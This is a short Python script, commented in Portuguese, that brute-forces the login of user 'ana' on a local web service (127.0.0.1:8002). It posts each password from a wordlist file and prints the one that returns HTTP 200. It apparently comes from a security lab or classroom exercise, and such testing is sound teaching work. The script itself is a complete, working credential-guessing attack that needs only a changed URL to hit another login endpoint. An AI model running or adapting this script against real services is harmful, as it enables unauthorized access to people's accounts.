import requests

# 1. Parâmetros de configuração
url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

print("Iniciando o teste de autenticação...")

# 2. Abertura do arquivo de senhas
with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()

        # 3. Envio da requisição com a credencial atual
        dados = {"usuario": usuario, "senha": senha}
        resposta = requests.post(url, json=dados)

        print(f"Testando senha: {senha} -> Status: {resposta.status_code}")

        # 4. Avaliação da resposta do servidor
        if resposta.status_code == 200:
            print("\n>>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<")
            print(f"A senha do usuário '{usuario}' é: {senha}")
            break

print("Processo finalizado.")
